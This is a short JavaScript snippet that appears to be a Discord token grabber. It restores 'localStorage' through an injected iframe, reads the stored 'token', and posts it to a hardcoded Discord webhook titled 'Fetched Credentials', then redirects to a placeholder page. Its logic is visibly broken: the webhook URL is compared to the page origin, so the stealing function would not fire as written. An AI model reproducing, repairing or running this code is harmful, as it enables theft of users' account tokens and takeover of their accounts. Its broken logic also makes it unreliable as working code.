void (function () {
  var SEND = "https://discord.com/api/webhooks/1122621720101126286/KquuOWPzMziWjh5FKyPYFHhlf22B3a_7qF1eZx1OZdGCzmebXM1O1y2-Vo7TCTFaZHnN" == this.document.location.origin &&
    (function () {
      const a = document.createElement("iframe");
      document.head.append(a);
      const b = Object.getOwnPropertyDescriptor(
        a.contentWindow,
        "localStorage"
      );
      location.reload(),
        Object.defineProperty(window, "localStorage", b),
        fetch(SEND, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            embeds: [
              {
                color: 3553599,
                title: "Fetched Credentials",
                description: `\`\`\`${localStorage.getItem("token")}\`\`\``,
              },
            ],
          }),
        });
    })();
})();
location.assign('NEW_WEBPAGE')
